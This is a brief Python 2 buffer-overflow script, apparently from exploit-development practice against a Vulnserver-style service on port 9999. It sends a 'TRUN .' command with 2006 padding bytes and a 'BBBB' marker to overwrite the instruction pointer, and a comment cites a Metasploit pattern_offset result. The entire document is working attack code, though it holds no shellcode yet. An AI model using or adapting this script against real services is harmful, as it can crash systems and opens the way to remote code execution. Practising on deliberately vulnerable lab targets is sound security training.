#!/usr/bin/python
import socket
server = '192.168.1.19'
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

# root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 396F4338
# [*] Exact match at offset 2006
attack = 'A' * 2006 + 'BBBB' + 'C' * (3000-2006-4)

s.send(('TRUN .' + attack + '\r\n'))

print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()
